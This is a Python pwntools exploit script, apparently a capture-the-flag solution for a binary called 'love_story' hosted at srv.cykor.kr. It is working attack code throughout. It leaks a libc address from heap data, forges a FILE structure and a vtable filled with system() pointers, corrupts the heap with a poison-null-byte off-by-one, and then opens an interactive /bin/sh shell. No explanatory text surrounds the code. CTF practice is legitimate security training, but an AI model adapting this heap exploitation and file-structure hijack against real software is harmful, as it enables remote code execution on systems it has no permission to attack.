from pwn import *

p = process('./love_story')
p = remote('srv.cykor.kr', 31005)
fake_fp = 0x604260
fake_vtable = 0x604060
target = 0x604460

def up():
    p.sendlineafter('>', 'D')
    p.sendlineafter('>', 'W')
    p.sendlineafter('>', 'C')

def add_memo(size, memo):
    p.sendlineafter('>', 'D')
    p.sendlineafter('>', 'D')
    p.sendlineafter('>', 'F')
    p.sendlineafter(')\n', 'L')
    p.sendlineafter('>', str(size))
    p.sendlineafter(':', memo)


def add_chat(size, chat):
    p.sendlineafter('>', 'D')
    p.sendlineafter('>', 'C')
    p.sendlineafter('>', 'A')
    p.sendlineafter('>', str(size))
    p.sendlineafter(':', chat)

def del_memo(idx):
    p.sendlineafter('>', 'D')
    p.sendlineafter('>', 'D')
    p.sendlineafter('>', 'F')
    p.sendlineafter(')\n', 'F')
    p.sendlineafter('>', str(idx))

def del_chat(idx):
    p.sendlineafter('>', 'D')
    p.sendlineafter('>', 'C')
    p.sendlineafter('>', 'D')
    p.sendlineafter('>', str(idx))

def view_chat():
    p.sendlineafter('>', 'D')
    p.sendlineafter('>', 'C')
    p.sendlineafter('>', 'V')

def set_H_name(name):
    p.sendlineafter('>', 'N')
    p.sendlineafter('>', 'H')
    p.sendlineafter(':', name)

def set_M_name(name):
    p.sendlineafter('>', 'N')
    p.sendlineafter('>', 'M')
    p.sendlineafter(':', name)

for i in range(64):
    log.info('{} hogamdo up'.format(str(i+1)))
    up()

#libc_leak
add_chat(200, 'AAAA')#0
add_chat(200, 'BBBB')#1
del_chat(0)
add_chat(200, '\n')#0
p.recvuntil('>')
view_chat()
p.recvuntil('-\n')
libc_base = u64(p.recv(6) + b'\x00\x00') - 0x3c4b20 - 88
system = libc_base + 0x45390 
log.info('libc_base : ' + hex(libc_base))
log.info('system : ' + hex(system))
del_chat(1)
del_chat(0)
#libc_leak

#fake struct
f_fp = b'/bin/sh;'
f_fp = f_fp.ljust(0x40, b'\x00')
f_fp += p64(fake_fp)
f_fp = f_fp.ljust(0x88, b'\x00')
f_fp += p64(fake_fp + 0x10)
f_fp = f_fp.ljust(0xd8, b'\x00')
f_fp += p64(fake_vtable)
f_fp = f_fp.ljust(0x1e0, b'\x00')
f_fp += p64(0) + p64(0x41)

set_H_name(f_fp)

f_vtable = p64(system)*20

set_M_name(f_vtable)
#fake struct

#poison null byte
add_memo(0x18, b'0'*0x18) #m0
add_chat(0x100, b'0'*0xf0 + p64(0x100)) #c0
add_chat(0x100, b'1'*0x100) #c1
del_chat(0)
del_memo(0)
add_memo(0x18, b'0'*0x18) #off-by-one

add_chat(0x80, b'0'*0x80) #c0
add_memo(0x10, b'1'*0x10) #m1 same
del_chat(0)
del_chat(1)
add_chat(0x80, b'0'*0x80) #c0
add_chat(0x100, b'1'*0x38 + p64(0x20fa1)) #c1 same
add_chat(0x100, b'2'*0x100)
del_chat(1)
del_chat(0)
add_chat(0x100, b'0'*0x80 + p64(0) + p64(0x41))#c0
del_memo(1)
del_chat(0)
add_chat(0x100, b'0'*0x80 + p64(0) + p64(0x41) + p64(target - 0x20))
add_memo(0x38, p64(target - 0x20)*7) #m1
add_memo(0x38, p64(0)*2 + p64(fake_fp)) #m2
#poison null byte

p.sendlineafter('>', 'C')

p.interactive()
